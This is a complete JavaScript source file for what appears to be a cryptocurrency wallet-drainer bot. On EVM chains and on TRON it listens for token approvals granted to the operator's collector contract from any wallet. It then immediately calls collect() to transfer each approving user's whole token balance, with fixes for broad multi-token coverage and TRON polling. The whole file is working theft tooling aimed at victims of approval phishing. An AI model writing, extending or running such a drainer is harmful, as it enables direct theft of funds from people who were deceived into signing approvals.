require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

// ==========================================
// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
// ==========================================
const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);

const EVM_TOKEN_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];
const EVM_COLLECTOR_ABI = [
    "function collect(address tokenAddress, address targetUser, uint256 amount) external"
];

const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);

// 🛠️ FIX 1: Dynamic Filter. Listens for ANY token approval given to YOUR Collector Address
const approvalFilter = {
    topics: [
        ethers.id("Approval(address,address,uint256)"), // Signature for the Approval event
        null, // Wildcard: We don't care who the owner is
        ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) // We ONLY care if the spender is YOU
    ]
};

// EVM Dynamic Listener
evmProvider.on(approvalFilter, async (log) => {
    try {
        const tokenAddress = log.address; // The smart contract address of the token that was approved
        const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); // The user's wallet address
        
        console.log(`\n[EVM] 🚨 NEW TOKEN APPROVAL DETECTED!`);
        console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
        
        // Dynamically instantiate the token contract to check their balance
        const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
        const balance = await dynamicTokenContract.balanceOf(owner);
        
        if (balance > 0n) {
            const decimals = await dynamicTokenContract.decimals();
            console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
            
            // Execute the multi-token sweep!
            const tx = await evmCollectorContract.collect(tokenAddress, owner, balance);
            console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
            
            await tx.wait();
            console.log(`[EVM] ✅ Successfully Swept!`);
        } else {
            console.log(`[EVM] ⚠️ User ${owner} approved, but balance is 0.`);
        }
    } catch (error) {
        console.error(`[EVM] ❌ Sweep Failed:`, error.message);
    }
});

console.log("✅ EVM Multi-Token Listener Active.");

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
// ==========================================
const tronWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_HOST,
    privateKey: process.env.TRON_PRIVATE_KEY
});

// Hardcoded ABI to bypass TronGrid rate limits
const TRON_USDT_ABI = [
    { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
];

const TRON_COLLECT_ABI = [
    { inputs: [{ name: 'tokenAddress', type: 'address' }, { name: 'targetUser', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' }
];

async function startTronListener() {
    try {
        const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
        const tronCollectorContract = await tronWeb.contract(TRON_COLLECT_ABI, process.env.TRON_COLLECTOR_ADDRESS);

        console.log("✅ TRON Listener Active (Polling Mode).");

        // Set the tracker to look for events starting from right now
        let lastProcessedTimestamp = Date.now() - 3000;
        
        // Memory Cache to remember which specific transactions we already processed
        const processedTxs = new Set();

        // Poll the blockchain every 3 seconds for new Approval events
        setInterval(async () => {
            try {
                // v6 Event Query API
                const events = await tronWeb.event.getEventsByContractAddress(
                    process.env.TRON_USDT_ADDRESS,
                    {
                        eventName: 'Approval',
                        minBlockTimestamp: lastProcessedTimestamp,
                        orderBy: 'block_timestamp,asc'
                    }
                );

                if (events && events.data && events.data.length > 0) {
                    for (const event of events.data) {
                        
                        // If we have already seen this exact Transaction ID, skip it immediately
                        if (processedTxs.has(event.transaction_id)) continue;
                        
                        // Add this new transaction to our memory
                        processedTxs.add(event.transaction_id);

                        // Prevent memory leaks: empty the cache if it gets too big (e.g., > 1000 txs)
                        if (processedTxs.size > 1000) processedTxs.clear();

                        // Move the timestamp forward
                        if (event.block_timestamp >= lastProcessedTimestamp) {
                            lastProcessedTimestamp = event.block_timestamp + 1;
                        }

                        // Tron returns addresses in HEX, convert to standard Base58 format
                        const spenderHex = event.result.spender || event.result._spender;
                        if (!spenderHex) continue;
                        
                        const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                        // Check if the approval was given to YOUR specific smart contract
                        if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                            const ownerHex = event.result.owner || event.result._owner;
                            const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                            console.log(`\n[TRON] 🚨 APPROVAL DETECTED! User: ${ownerBase58}`);

                            try {
                                const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                const balanceStr = balanceObj.toString();

                                if (Number(balanceStr) > 0) {
                                    console.log(`[TRON] Sweeping ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
                                    
                                    // 🛠️ FIX 2: Added process.env.TRON_USDT_ADDRESS as the first parameter
                                    const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
                                        feeLimit: 150_000_000
                                    });
                                    
                                    console.log(`[TRON] ✅ Sweep TX Sent! Hash: ${txId}`);
                                } else {
                                    console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
                                }
                            } catch (error) {
                                console.error(`[TRON] ❌ Sweep Failed:`, error.message);
                            }
                        }
                    }
                }
            } catch (pollError) {
                // Silently catch API timeout errors so it doesn't spam your console
            }
        }, 3000); // 3000ms = 3 seconds
        
    } catch (e) {
        console.error("Failed to initialize TRON listener:", e.message);
    }
}

startTronListener();